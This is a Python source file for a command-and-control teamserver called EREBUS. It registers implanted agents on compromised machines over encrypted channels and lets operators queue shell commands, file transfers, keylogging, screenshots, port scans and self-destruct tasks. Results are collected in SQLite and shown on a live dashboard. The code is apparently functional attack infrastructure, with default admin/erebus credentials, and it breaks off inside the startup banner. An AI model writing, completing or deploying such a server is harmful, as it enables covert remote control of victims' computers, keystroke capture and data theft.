"""
EREBUS C2 Teamserver — Multi-Operator Command & Control

Security architecture:
  - MASTER_KEY: bootstraps agent registration (one-time, never transmitted again)
    Loaded from env EREBUS_MASTER_KEY or auto-generated + saved to c2_master.key on first run.
  - Per-agent AES-256-EAX keys: generated at registration, stored AES-encrypted in SQLite.
  - Request integrity: HMAC-SHA256(agent_key, timestamp‖nonce‖tag‖ciphertext) with 5-min
    replay window — prevents forgery and replay attacks.
  - Operator auth: PBKDF2-SHA256 (600 000 iterations, random salt), random 256-bit session tokens.
  - Operator sessions expire after 12 h of inactivity.
  - All operator actions written to audit log in SQLite.

Wire format (agent ↔ server, post-registration):
  [hmac_sha256: 32][timestamp_be: 8][nonce: 16][tag: 16][ciphertext: N]

Persistence  : SQLite (c2.db by default)
Transport    : HTTPS + WSS (ssl_context configurable; 'adhoc' for dev)
Agent paths  : POST /a/reg  /a/in  /a/out  /a/hb
Operator UI  : WebSocket + dashboard at /
"""

import base64
import hashlib
import hmac as _hmac
import json
import logging
import os
import secrets
import sqlite3
import struct
import threading
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Any, Dict, List, Optional

from flask import Flask, Response, render_template_string, request
from flask_socketio import SocketIO, emit
from Crypto.Cipher import AES


# ---------------------------------------------------------------------------
# Configuration constants
# ---------------------------------------------------------------------------

_REPLAY_WINDOW   = 300        # seconds — reject requests older than this
_INACTIVE_AFTER  = 180        # seconds since last check-in → INACTIVE
_DEAD_AFTER      = 600        # seconds since last check-in → DEAD
_PBKDF2_ITERS    = 600_000    # PBKDF2-SHA256 iterations for operator passwords
_SESSION_TTL     = 43_200     # 12 h operator session validity (monotonic seconds)
_RL_WINDOW       = 60         # rate-limit window in seconds
_RL_MAX          = 120        # max requests per window per remote IP
_MONITOR_INTERVAL = 30        # heartbeat monitor polling interval (seconds)
_MASTER_KEY_FILE = "c2_master.key"
_DB_PATH         = "c2.db"


# ---------------------------------------------------------------------------
# Enumerations
# ---------------------------------------------------------------------------

class AgentStatus(str, Enum):
    PENDING  = "pending"
    ACTIVE   = "active"
    INACTIVE = "inactive"
    DEAD     = "dead"


class TaskStatus(str, Enum):
    PENDING   = "pending"
    SENT      = "sent"
    RUNNING   = "running"
    COMPLETED = "completed"
    FAILED    = "failed"
    TIMEOUT   = "timeout"
    CANCELLED = "cancelled"


class TaskType(str, Enum):
    SHELL        = "shell"
    UPLOAD       = "upload"
    DOWNLOAD     = "download"
    PROC_LIST    = "proc_list"
    FILE_LIST    = "file_list"
    KEYLOG_START = "keylog_start"
    KEYLOG_STOP  = "keylog_stop"
    PORT_SCAN    = "port_scan"
    SCREENSHOT   = "screenshot"
    SLEEP        = "sleep"
    SELFDESTRUCT = "selfdestruct"


class OperatorRole(str, Enum):
    ADMIN  = "admin"
    VIEWER = "viewer"


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class AgentRecord:
    agent_id: str
    hostname: str
    username: str
    os: str
    arch: str
    ip: str
    privileges: str
    agent_key_enc: bytes
    first_seen: str
    last_seen: str
    status: AgentStatus = AgentStatus.PENDING
    checkin_count: int = 0
    metadata: Dict = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            "agent_id":     self.agent_id,
            "hostname":     self.hostname,
            "username":     self.username,
            "os":           self.os,
            "arch":         self.arch,
            "ip":           self.ip,
            "privileges":   self.privileges,
            "first_seen":   self.first_seen,
            "last_seen":    self.last_seen,
            "status":       self.status.value,
            "checkin_count": self.checkin_count,
            "metadata":     self.metadata,
        }


@dataclass
class TaskRecord:
    task_id: str
    agent_id: str
    task_type: TaskType
    command: str
    args: Dict
    status: TaskStatus
    created_at: str
    operator: str
    sent_at: Optional[str] = None
    completed_at: Optional[str] = None

    def to_dict(self) -> Dict:
        return {
            "task_id":      self.task_id,
            "agent_id":     self.agent_id,
            "type":         self.task_type.value,
            "command":      self.command,
            "args":         self.args,
            "status":       self.status.value,
            "created_at":   self.created_at,
            "operator":     self.operator,
            "sent_at":      self.sent_at,
            "completed_at": self.completed_at,
        }


@dataclass
class OperatorSession:
    token: str
    username: str
    role: OperatorRole
    socket_id: str
    connected_at: str
    expires_at: float   # monotonic
    ip: str


# ---------------------------------------------------------------------------
# Crypto
# ---------------------------------------------------------------------------

class CryptoManager:
    """
    All cryptographic operations for the teamserver.

    Wire frame produced by _pack(plaintext, key):
        hmac_sha256[32] | timestamp_be[8] | nonce[16] | tag[16] | ciphertext[N]

    hmac covers everything after the HMAC field itself.
    """

    def __init__(self, master_key: bytes):
        assert len(master_key) == 32, "master_key must be 32 bytes"
        self._master = master_key

    # -- Key material --------------------------------------------------

    def generate_agent_key(self) -> bytes:
        return secrets.token_bytes(32)

    def seal_agent_key(self, agent_key: bytes) -> bytes:
        """Encrypt agent_key with master key for DB storage."""
        return self._seal(agent_key, self._master)

    def unseal_agent_key(self, blob: bytes) -> bytes:
        return self._unseal(blob, self._master)

    # -- Registration (master key) -------------------------------------

    def unpack_registration(self, body: bytes) -> bytes:
        return self._unpack(body, self._master)

    def pack_reg_response(self, payload: bytes) -> bytes:
        return self._pack(payload, self._master)

    # -- Agent requests (per-agent key) --------------------------------

    def unpack_request(self, body: bytes, agent_key: bytes) -> bytes:
        return self._unpack(body, agent_key)

    def pack_response(self, payload: bytes, agent_key: bytes) -> bytes:
        return self._pack(payload, agent_key)

    # -- Password hashing ----------------------------------------------

    @staticmethod
    def hash_password(password: str) -> str:
        salt = secrets.token_bytes(32)
        dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, _PBKDF2_ITERS)
        return salt.hex() + "$" + dk.hex()

    @staticmethod
    def verify_password(password: str, stored: str) -> bool:
        try:
            salt_h, dk_h = stored.split("$", 1)
            salt = bytes.fromhex(salt_h)
            expected = bytes.fromhex(dk_h)
            actual = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, _PBKDF2_ITERS)
            return _hmac.compare_digest(actual, expected)
        except Exception:
            return False

    # -- Internal primitives -------------------------------------------

    def _pack(self, plaintext: bytes, key: bytes) -> bytes:
        ts = struct.pack(">Q", int(time.time()))
        cipher = AES.new(key, AES.MODE_EAX)
        ct, tag = cipher.encrypt_and_digest(plaintext)
        body = ts + cipher.nonce + tag + ct
        sig = _hmac.new(key, body, hashlib.sha256).digest()
        return sig + body

    def _unpack(self, frame: bytes, key: bytes) -> bytes:
        if len(frame) < 32 + 8 + 16 + 16:
            raise ValueError("Frame too short")
        sig, body = frame[:32], frame[32:]
        expected = _hmac.new(key, body, hashlib.sha256).digest()
        if not _hmac.compare_digest(sig, expected):
            raise ValueError("HMAC mismatch")
        ts = struct.unpack(">Q", body[:8])[0]
        if abs(time.time() - ts) > _REPLAY_WINDOW:
            raise ValueError(f"Timestamp out of window (drift {abs(time.time()-ts):.0f}s)")
        nonce, tag, ct = body[8:24], body[24:40], body[40:]
        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag)

    @staticmethod
    def _seal(data: bytes, key: bytes) -> bytes:
        c = AES.new(key, AES.MODE_EAX)
        ct, tag = c.encrypt_and_digest(data)
        return c.nonce + tag + ct

    @staticmethod
    def _unseal(blob: bytes, key: bytes) -> bytes:
        n, tag, ct = blob[:16], blob[16:32], blob[32:]
        return AES.new(key, AES.MODE_EAX, nonce=n).decrypt_and_verify(ct, tag)


# ---------------------------------------------------------------------------
# SQLite persistence
# ---------------------------------------------------------------------------

_SCHEMA = """
PRAGMA journal_mode=WAL;
CREATE TABLE IF NOT EXISTS agents (
    agent_id      TEXT PRIMARY KEY,
    hostname      TEXT NOT NULL,
    username      TEXT NOT NULL,
    os            TEXT NOT NULL,
    arch          TEXT NOT NULL,
    ip            TEXT NOT NULL,
    privileges    TEXT NOT NULL,
    agent_key_enc BLOB NOT NULL,
    first_seen    TEXT NOT NULL,
    last_seen     TEXT NOT NULL,
    status        TEXT NOT NULL DEFAULT 'pending',
    checkin_count INTEGER NOT NULL DEFAULT 0,
    metadata      TEXT NOT NULL DEFAULT '{}'
);
CREATE TABLE IF NOT EXISTS tasks (
    task_id      TEXT PRIMARY KEY,
    agent_id     TEXT NOT NULL,
    task_type    TEXT NOT NULL,
    command      TEXT NOT NULL,
    args         TEXT NOT NULL DEFAULT '{}',
    status       TEXT NOT NULL DEFAULT 'pending',
    created_at   TEXT NOT NULL,
    operator     TEXT NOT NULL,
    sent_at      TEXT,
    completed_at TEXT,
    FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
);
CREATE TABLE IF NOT EXISTS results (
    id        INTEGER PRIMARY KEY AUTOINCREMENT,
    task_id   TEXT NOT NULL,
    agent_id  TEXT NOT NULL,
    output    TEXT NOT NULL,
    success   INTEGER NOT NULL,
    timestamp TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS operators (
    username      TEXT PRIMARY KEY,
    password_hash TEXT NOT NULL,
    role          TEXT NOT NULL DEFAULT 'viewer',
    created_at    TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS events (
    id        INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    level     TEXT NOT NULL,
    source    TEXT NOT NULL,
    message   TEXT NOT NULL,
    data      TEXT NOT NULL DEFAULT '{}'
);
"""


class AgentStore:
    """Thread-safe SQLite store for agents, tasks, results, operators, and events."""

    def __init__(self, db_path: str = _DB_PATH):
        self._path = db_path
        self._lock = threading.Lock()
        with self._lock:
            with sqlite3.connect(self._path) as c:
                c.executescript(_SCHEMA)
                c.row_factory = sqlite3.Row

    def _conn(self) -> sqlite3.Connection:
        c = sqlite3.connect(self._path)
        c.row_factory = sqlite3.Row
        return c

    # -- Agents ----------------------------------------------------------

    def upsert_agent(self, a: AgentRecord) -> None:
        with self._lock, self._conn() as c:
            c.execute(
                "INSERT OR REPLACE INTO agents "
                "(agent_id,hostname,username,os,arch,ip,privileges,agent_key_enc,"
                "first_seen,last_seen,status,checkin_count,metadata) "
                "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (a.agent_id, a.hostname, a.username, a.os, a.arch, a.ip,
                 a.privileges, a.agent_key_enc, a.first_seen, a.last_seen,
                 a.status.value, a.checkin_count, json.dumps(a.metadata)),
            )

    def checkin_agent(self, agent_id: str, last_seen: str) -> None:
        with self._lock, self._conn() as c:
            c.execute(
                "UPDATE agents SET status='active', last_seen=?, checkin_count=checkin_count+1 "
                "WHERE agent_id=?",
                (last_seen, agent_id),
            )

    def set_agent_status(self, agent_id: str, status: AgentStatus) -> None:
        with self._lock, self._conn() as c:
            c.execute("UPDATE agents SET status=? WHERE agent_id=?",
                      (status.value, agent_id))

    def get_agent(self, agent_id: str) -> Optional[AgentRecord]:
        with self._lock, self._conn() as c:
            row = c.execute("SELECT * FROM agents WHERE agent_id=?", (agent_id,)).fetchone()
        return self._agent(row) if row else None

    def all_agents(self) -> List[AgentRecord]:
        with self._lock, self._conn() as c:
            rows = c.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
        return [self._agent(r) for r in rows]

    def _agent(self, r) -> AgentRecord:
        return AgentRecord(
            agent_id=r["agent_id"], hostname=r["hostname"], username=r["username"],
            os=r["os"], arch=r["arch"], ip=r["ip"], privileges=r["privileges"],
            agent_key_enc=r["agent_key_enc"], first_seen=r["first_seen"],
            last_seen=r["last_seen"], status=AgentStatus(r["status"]),
            checkin_count=r["checkin_count"], metadata=json.loads(r["metadata"]),
        )

    # -- Tasks -----------------------------------------------------------

    def insert_task(self, t: TaskRecord) -> None:
        with self._lock, self._conn() as c:
            c.execute(
                "INSERT INTO tasks "
                "(task_id,agent_id,task_type,command,args,status,created_at,operator) "
                "VALUES (?,?,?,?,?,?,?,?)",
                (t.task_id, t.agent_id, t.task_type.value, t.command,
                 json.dumps(t.args), t.status.value, t.created_at, t.operator),
            )

    def mark_tasks_sent(self, task_ids: List[str]) -> None:
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock, self._conn() as c:
            c.executemany(
                "UPDATE tasks SET status='sent', sent_at=? WHERE task_id=?",
                [(ts, tid) for tid in task_ids],
            )

    def update_task(self, task_id: str, status: TaskStatus, completed_at: Optional[str] = None) -> None:
        with self._lock, self._conn() as c:
            if completed_at:
                c.execute("UPDATE tasks SET status=?, completed_at=? WHERE task_id=?",
                          (status.value, completed_at, task_id))
            else:
                c.execute("UPDATE tasks SET status=? WHERE task_id=?",
                          (status.value, task_id))

    def pending_tasks(self, agent_id: str) -> List[TaskRecord]:
        with self._lock, self._conn() as c:
            rows = c.execute(
                "SELECT * FROM tasks WHERE agent_id=? AND status='pending' ORDER BY created_at",
                (agent_id,),
            ).fetchall()
        return [self._task(r) for r in rows]

    def agent_tasks(self, agent_id: str, limit: int = 50) -> List[TaskRecord]:
        with self._lock, self._conn() as c:
            rows = c.execute(
                "SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT ?",
                (agent_id, limit),
            ).fetchall()
        return [self._task(r) for r in rows]

    def _task(self, r) -> TaskRecord:
        return TaskRecord(
            task_id=r["task_id"], agent_id=r["agent_id"],
            task_type=TaskType(r["task_type"]), command=r["command"],
            args=json.loads(r["args"]), status=TaskStatus(r["status"]),
            created_at=r["created_at"], operator=r["operator"],
            sent_at=r["sent_at"], completed_at=r["completed_at"],
        )

    # -- Results ---------------------------------------------------------

    def insert_result(self, task_id: str, agent_id: str, output: str, success: bool) -> None:
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock, self._conn() as c:
            c.execute(
                "INSERT INTO results (task_id,agent_id,output,success,timestamp) VALUES (?,?,?,?,?)",
                (task_id, agent_id, output, int(success), ts),
            )

    def agent_results(self, agent_id: str, limit: int = 100) -> List[Dict]:
        with self._lock, self._conn() as c:
            rows = c.execute(
                "SELECT * FROM results WHERE agent_id=? ORDER BY timestamp DESC LIMIT ?",
                (agent_id, limit),
            ).fetchall()
        return [dict(r) for r in rows]

    # -- Operators -------------------------------------------------------

    def add_operator(self, username: str, password_hash: str, role: OperatorRole) -> None:
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock, self._conn() as c:
            c.execute(
                "INSERT OR IGNORE INTO operators (username,password_hash,role,created_at) VALUES (?,?,?,?)",
                (username, password_hash, role.value, ts),
            )

    def get_operator(self, username: str) -> Optional[Dict]:
        with self._lock, self._conn() as c:
            r = c.execute("SELECT * FROM operators WHERE username=?", (username,)).fetchone()
        return dict(r) if r else None

    # -- Events ----------------------------------------------------------

    def log(self, level: str, source: str, message: str, data: Dict = None) -> None:
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock, self._conn() as c:
            c.execute(
                "INSERT INTO events (timestamp,level,source,message,data) VALUES (?,?,?,?,?)",
                (ts, level, source, message, json.dumps(data or {})),
            )

    def recent_events(self, limit: int = 100) -> List[Dict]:
        with self._lock, self._conn() as c:
            rows = c.execute(
                "SELECT * FROM events ORDER BY id DESC LIMIT ?", (limit,)
            ).fetchall()
        return [dict(r) for r in reversed(rows)]


# ---------------------------------------------------------------------------
# Background heartbeat monitor
# ---------------------------------------------------------------------------

class AgentMonitor:
    """
    Background thread that marks agents INACTIVE / DEAD based on last check-in time.
    Broadcasts status changes to operators via the provided emit callback.
    """

    def __init__(self, store: AgentStore, broadcast_fn):
        self._store = store
        self._broadcast = broadcast_fn
        self._stop = threading.Event()
        self._thread = threading.Thread(target=self._loop, daemon=True, name="AgentMonitor")

    def start(self) -> None:
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()

    def _loop(self) -> None:
        while not self._stop.wait(_MONITOR_INTERVAL):
            self._tick()

    def _tick(self) -> None:
        now = time.time()
        for agent in self._store.all_agents():
            if agent.status == AgentStatus.DEAD:
                continue
            try:
                last = datetime.fromisoformat(agent.last_seen).timestamp()
            except Exception:
                continue
            delta = now - last
            new_status: Optional[AgentStatus] = None
            if delta > _DEAD_AFTER and agent.status != AgentStatus.DEAD:
                new_status = AgentStatus.DEAD
            elif delta > _INACTIVE_AFTER and agent.status == AgentStatus.ACTIVE:
                new_status = AgentStatus.INACTIVE

            if new_status:
                self._store.set_agent_status(agent.agent_id, new_status)
                self._store.log("WARN", "monitor",
                                f"Agent {agent.agent_id} → {new_status.value}",
                                {"agent_id": agent.agent_id})
                self._broadcast("agent_status", {
                    "agent_id": agent.agent_id,
                    "status": new_status.value,
                })


# ---------------------------------------------------------------------------
# Rate limiter
# ---------------------------------------------------------------------------

class RateLimiter:
    """Simple in-memory per-IP sliding-window rate limiter."""

    def __init__(self, max_requests: int = _RL_MAX, window: int = _RL_WINDOW):
        self._max = max_requests
        self._window = window
        self._counts: Dict[str, List[float]] = defaultdict(list)
        self._lock = threading.Lock()

    def allow(self, ip: str) -> bool:
        now = time.monotonic()
        cutoff = now - self._window
        with self._lock:
            ts_list = self._counts[ip]
            # Prune old entries
            while ts_list and ts_list[0] < cutoff:
                ts_list.pop(0)
            if len(ts_list) >= self._max:
                return False
            ts_list.append(now)
            return True


# ---------------------------------------------------------------------------
# Master key bootstrap
# ---------------------------------------------------------------------------

def _load_or_create_master_key() -> bytes:
    env_key = os.environ.get("EREBUS_MASTER_KEY")
    if env_key:
        k = bytes.fromhex(env_key)
        assert len(k) == 32, "EREBUS_MASTER_KEY must be 32 bytes (64 hex chars)"
        return k
    if os.path.exists(_MASTER_KEY_FILE):
        with open(_MASTER_KEY_FILE, "rb") as f:
            return f.read()
    key = secrets.token_bytes(32)
    with open(_MASTER_KEY_FILE, "wb") as f:
        f.write(key)
    logging.warning("Generated new master key → %s  (embed hex in agents: %s)",
                    _MASTER_KEY_FILE, key.hex())
    return key


# ---------------------------------------------------------------------------
# TeamServer
# ---------------------------------------------------------------------------

class TeamServer:
    """
    Multi-operator C2 teamserver.

    Default operator account created on first run:  admin / erebus  (change immediately).

    Agent wire protocol — see CryptoManager docstring.
    The existing c2/agent.py must be updated to include:
      - Per-request HMAC-SHA256 (see CryptoManager._pack)
      - arch field in registration payload
      - Use per-agent key returned in registration response for subsequent requests
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8443,
                 db_path: str = _DB_PATH, ssl_context: Any = "adhoc"):
        self.host = host
        self.port = port
        self._ssl_ctx = ssl_context

        # Core services
        self._crypto = CryptoManager(_load_or_create_master_key())
        self._store = AgentStore(db_path)
        self._rl = RateLimiter()

        # In-memory operator sessions keyed by token (not socket SID)
        self._sessions: Dict[str, OperatorSession] = {}  # token → session
        self._sid_to_token: Dict[str, str] = {}           # socket_sid → token
        self._lock = threading.Lock()

        # Flask / SocketIO
        self.app = Flask(__name__)
        self.app.config["SECRET_KEY"] = secrets.token_hex(32)
        self.socketio = SocketIO(self.app, cors_allowed_origins="*",
                                 async_mode="threading", logger=False,
                                 engineio_logger=False)

        self._monitor = AgentMonitor(self._store, self._broadcast)

        # Seed default admin if no operators exist
        self._seed_default_operator()

        self._setup_routes()
        self._setup_ws_handlers()

        logging.basicConfig(
            level=logging.INFO,
            format="[%(asctime)s] %(levelname)s %(message)s",
            datefmt="%H:%M:%S",
        )

    # ------------------------------------------------------------------
    # HTTP routes (agent endpoints)
    # ------------------------------------------------------------------

    def _setup_routes(self) -> None:

        app = self.app

        @app.route("/")
        def dashboard():
            return render_template_string(DASHBOARD_HTML)

        # -- Registration -------------------------------------------
        @app.route("/a/reg", methods=["POST"])
        def agent_register():
            ip = request.remote_addr
            if not self._rl.allow(ip):
                return Response(status=429)
            try:
                body = self._crypto.unpack_registration(request.data)
                info = json.loads(body)
                agent_id = info["agent_id"]

                agent_key = self._crypto.generate_agent_key()
                agent_key_enc = self._crypto.seal_agent_key(agent_key)

                now = datetime.now(timezone.utc).isoformat()
                a = AgentRecord(
                    agent_id=agent_id,
                    hostname=info.get("hostname", "unknown"),
                    username=info.get("username", "unknown"),
                    os=info.get("os", "unknown"),
                    arch=info.get("arch", "unknown"),
                    ip=ip,
                    privileges=info.get("privileges", "user"),
                    agent_key_enc=agent_key_enc,
                    first_seen=now,
                    last_seen=now,
                    status=AgentStatus.ACTIVE,
                )
                self._store.upsert_agent(a)
                self._store.log("INFO", "agent", f"Agent registered: {agent_id} ({a.hostname})",
                                {"agent_id": agent_id, "ip": ip})

                self._broadcast("agent_new", a.to_dict())
                logging.info("[REG ] %s (%s@%s)", agent_id, a.username, a.hostname)

                resp_payload = json.dumps({
                    "status": "ok",
                    "agent_key": agent_key.hex(),
                }).encode()
                return Response(
                    self._crypto.pack_reg_response(resp_payload),
                    content_type="application/octet-stream",
                )
            except Exception as exc:
                logging.warning("[REG ] rejected from %s: %s", ip, exc)
                return Response(status=400)

        # -- Check-in -----------------------------------------------
        @app.route("/a/in", methods=["POST"])
        def agent_checkin():
            ip = request.remote_addr
            if not self._rl.allow(ip):
                return Response(status=429)
            try:
                agent_id, agent_key, body = self._identify_agent(request.data)
                _ = json.loads(body)  # validate JSON, ignore content

                now = datetime.now(timezone.utc).isoformat()
                self._store.checkin_agent(agent_id, now)
                agent = self._store.get_agent(agent_id)
                if agent:
                    self._broadcast("agent_update", agent.to_dict())

                tasks = self._store.pending_tasks(agent_id)
                task_ids = [t.task_id for t in tasks]
                if task_ids:
                    self._store.mark_tasks_sent(task_ids)
                    for t in tasks:
                        self._broadcast("task_updated", {**t.to_dict(), "status": "sent"})

                resp = json.dumps({"tasks": [t.to_dict() for t in tasks]}).encode()
                return Response(
                    self._crypto.pack_response(resp, agent_key),
                    content_type="application/octet-stream",
                )
            except Exception as exc:
                logging.warning("[IN  ] rejected from %s: %s", ip, exc)
                return Response(status=400)

        # -- Task result --------------------------------------------
        @app.route("/a/out", methods=["POST"])
        def agent_result():
            ip = request.remote_addr
            if not self._rl.allow(ip):
                return Response(status=429)
            try:
                agent_id, agent_key, body = self._identify_agent(request.data)
                data = json.loads(body)
                task_id = data["task_id"]
                output = data.get("output", "")
                success = bool(data.get("success", True))

                ts = datetime.now(timezone.utc).isoformat()
                self._store.update_task(
                    task_id,
                    TaskStatus.COMPLETED if success else TaskStatus.FAILED,
                    completed_at=ts,
                )
                self._store.insert_result(task_id, agent_id, output, success)
                self._store.log("INFO", "agent", f"Result from {agent_id} for task {task_id}",
                                {"agent_id": agent_id, "task_id": task_id, "success": success})

                self._broadcast("task_result", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "output": output,
                    "success": success,
                    "timestamp": ts,
                })
                logging.info("[OUT ] %s task=%s ok=%s", agent_id, task_id, success)

                resp = json.dumps({"status": "ok"}).encode()
                return Response(
                    self._crypto.pack_response(resp, agent_key),
                    content_type="application/octet-stream",
                )
            except Exception as exc:
                logging.warning("[OUT ] rejected from %s: %s", ip, exc)
                return Response(status=400)

        # -- Heartbeat (lightweight) --------------------------------
        @app.route("/a/hb", methods=["POST"])
        def agent_heartbeat():
            ip = request.remote_addr
            if not self._rl.allow(ip):
                return Response(status=429)
            try:
                agent_id, agent_key, _ = self._identify_agent(request.data)
                now = datetime.now(timezone.utc).isoformat()
                self._store.checkin_agent(agent_id, now)
                resp = json.dumps({"ts": int(time.time())}).encode()
                return Response(
                    self._crypto.pack_response(resp, agent_key),
                    content_type="application/octet-stream",
                )
            except Exception as exc:
                logging.debug("[HB  ] %s: %s", ip, exc)
                return Response(status=400)

    # ------------------------------------------------------------------
    # WebSocket handlers (operator UI)
    # ------------------------------------------------------------------

    def _setup_ws_handlers(self) -> None:

        sio = self.socketio

        @sio.on("connect")
        def on_connect():
            logging.info("[WS  ] connect %s from %s",
                         request.sid, request.remote_addr)

        @sio.on("disconnect")
        def on_disconnect():
            sid = request.sid
            with self._lock:
                token = self._sid_to_token.pop(sid, None)
                if token:
                    sess = self._sessions.pop(token, None)
                    if sess:
                        self._store.log("AUDIT", "operator",
                                        f"Operator {sess.username} disconnected", {})
                        self._broadcast("operator_left", {"username": sess.username})
                        logging.info("[WS  ] operator %s disconnected", sess.username)

        @sio.on("op_auth")
        def on_auth(data):
            username = str(data.get("username", ""))
            password = str(data.get("password", ""))
            op = self._store.get_operator(username)
            if not op or not CryptoManager.verify_password(password, op["password_hash"]):
                emit("auth_fail", {"error": "Invalid credentials"})
                self._store.log("WARN", "operator",
                                f"Failed auth attempt for '{username}'",
                                {"ip": request.remote_addr})
                return

            token = secrets.token_hex(32)
            sess = OperatorSession(
                token=token,
                username=username,
                role=OperatorRole(op["role"]),
                socket_id=request.sid,
                connected_at=datetime.now(timezone.utc).isoformat(),
                expires_at=time.monotonic() + _SESSION_TTL,
                ip=request.remote_addr,
            )
            with self._lock:
                self._sessions[token] = sess
                self._sid_to_token[request.sid] = token

            self._store.log("AUDIT", "operator",
                            f"Operator {username} authenticated", {"ip": request.remote_addr})
            logging.info("[AUTH] operator %s (%s) from %s", username, op["role"], request.remote_addr)

            emit("auth_ok", {
                "token":   token,
                "role":    op["role"],
                "agents":  [a.to_dict() for a in self._store.all_agents()],
                "events":  self._store.recent_events(50),
                "operators": self._online_operators(),
            })
            self._broadcast("operator_joined", {"username": username, "role": op["role"]})

        @sio.on("task_create")
        def on_task_create(data):
            sess = self._get_session()
            if not sess:
                emit("error", {"msg": "Not authenticated"})
                return
            if sess.role == OperatorRole.VIEWER:
                emit("error", {"msg": "Viewers cannot create tasks"})
                return

            agent_id  = data.get("agent_id", "")
            cmd       = data.get("command", "")
            task_type_str = data.get("type", "shell")
            args      = data.get("args", {})

            if not agent_id or not cmd:
                emit("error", {"msg": "agent_id and command required"})
                return

            try:
                tt = TaskType(task_type_str)
            except ValueError:
                emit("error", {"msg": f"Unknown task type: {task_type_str}"})
                return

            task_id = str(uuid.uuid4()).replace("-", "")[:16]
            now = datetime.now(timezone.utc).isoformat()
            task = TaskRecord(
                task_id=task_id, agent_id=agent_id, task_type=tt,
                command=cmd, args=args, status=TaskStatus.PENDING,
                created_at=now, operator=sess.username,
            )
            self._store.insert_task(task)
            self._store.log("AUDIT", "operator",
                            f"{sess.username} created task {task_id} ({tt.value}) on {agent_id}",
                            {"task": task.to_dict()})
            logging.info("[TASK] %s → %s: %s", sess.username, agent_id, cmd[:80])
            self._broadcast("task_created", task.to_dict())

        @sio.on("task_cancel")
        def on_task_cancel(data):
            sess = self._get_session()
            if not sess or sess.role == OperatorRole.VIEWER:
                emit("error", {"msg": "Unauthorized"})
                return
            task_id = data.get("task_id", "")
            self._store.update_task(task_id, TaskStatus.CANCELLED)
            self._store.log("AUDIT", "operator",
                            f"{sess.username} cancelled task {task_id}", {})
            self._broadcast("task_updated", {"task_id": task_id, "status": "cancelled"})

        @sio.on("get_agent_detail")
        def on_agent_detail(data):
            sess = self._get_session()
            if not sess:
                emit("error", {"msg": "Not authenticated"})
                return
            agent_id = data.get("agent_id", "")
            agent = self._store.get_agent(agent_id)
            if not agent:
                emit("error", {"msg": "Agent not found"})
                return
            emit("agent_detail", {
                "agent":   agent.to_dict(),
                "tasks":   [t.to_dict() for t in self._store.agent_tasks(agent_id)],
                "results": self._store.agent_results(agent_id, 20),
            })

        @sio.on("op_chat")
        def on_chat(data):
            sess = self._get_session()
            if not sess:
                return
            msg = str(data.get("msg", ""))[:500]
            if msg:
                self._broadcast("op_chat", {"from": sess.username, "msg": msg,
                                            "ts": datetime.now(timezone.utc).isoformat()})

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _identify_agent(self, body: bytes):
        """
        Identify the calling agent by trying each registered key in turn.

        O(n) in agent count — acceptable for red team scale (tens to low hundreds
        of agents). Each attempt is a constant-time AES-EAX + HMAC-SHA256 op.
        Adding a plaintext agent_id prefix would give O(1) but leaks a static
        correlator, defeating traffic opacity. The current approach keeps every
        frame fully opaque.
        """
        if len(body) < 32 + 8 + 16 + 16:
            raise ValueError("Body too short")
        for agent in self._store.all_agents():
            try:
                agent_key = self._crypto.unseal_agent_key(agent.agent_key_enc)
                plaintext = self._crypto.unpack_request(body, agent_key)
                data = json.loads(plaintext)
                if data.get("agent_id") == agent.agent_id:
                    return agent.agent_id, agent_key, plaintext
            except Exception:
                continue
        raise ValueError("No matching agent key found")

    def _get_session(self) -> Optional[OperatorSession]:
        with self._lock:
            token = self._sid_to_token.get(request.sid)
            if not token:
                return None
            sess = self._sessions.get(token)
            if not sess or time.monotonic() > sess.expires_at:
                self._sessions.pop(token, None)
                return None
            return sess

    def _broadcast(self, event: str, data: Dict) -> None:
        self.socketio.emit(event, data)

    def _online_operators(self) -> List[Dict]:
        with self._lock:
            return [
                {"username": s.username, "role": s.role.value, "connected_at": s.connected_at}
                for s in self._sessions.values()
                if time.monotonic() < s.expires_at
            ]

    def _seed_default_operator(self) -> None:
        if not self._store.get_operator("admin"):
            h = CryptoManager.hash_password("erebus")
            self._store.add_operator("admin", h, OperatorRole.ADMIN)
            logging.warning("Default operator created: admin / erebus — change this password!")

    # ------------------------------------------------------------------
    # Public helpers
    # ------------------------------------------------------------------

    def add_operator(self, username: str, password: str, role: OperatorRole = OperatorRole.VIEWER) -> None:
        h = CryptoManager.hash_password(password)
        self._store.add_operator(username, h, role)
        logging.info("Operator added: %s (%s)", username, role.value)

    def get_master_key_hex(self) -> str:
        """Return master key hex for embedding in generated agents."""
        return self._crypto._master.hex()

    def run(self) -> None:
        self._monitor.start()
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║              EREBUS C2 TEAMSERVER v2                         ║
╠══════════════════════════════════════════════════════════════╣
║  Endpoint  : https://{self.host}:{self.port}                 ║
║  Dashboard : https://{self.host}:{self.port}/                ║
║  Encryption: AES-256-EAX + HMAC-SHA256 per-agent keys        ║
║  DB        : {_DB_PATH:<46} ║
╠══════════════════════════════════════════════════════════════╣
║  Default operator:  admin / erebus  (change immediately!)    ║
╚══════════════════════════════════════════════════════════════╝

  Master key (embed in agents):  {self.get_master_key_hex()}

  Agent registration endpoint:   POST /a/reg
  Check-in endpoint:             POST /a/in
